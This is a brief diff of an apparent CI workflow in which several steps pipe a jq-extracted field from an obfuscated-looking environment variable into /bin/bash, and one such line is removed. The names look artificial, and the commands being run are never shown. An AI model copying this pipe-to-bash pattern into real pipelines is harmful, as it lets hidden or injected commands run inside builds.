@@ -23,7 +23,6 @@ jobs:
           echo $bsu6029 | jq -r .ws18 | /bin/bash
           echo $zo72 | jq -r .ff0 | /bin/bash
           echo $jchex9644 | jq -r .rngv01912 | /bin/bash
-          printf '%s' "$ujvik6" | jq -r .xwoq34914 | /bin/bash
           echo $y983 | jq -r .pg6905 | /bin/bash
 
       - name: Save results
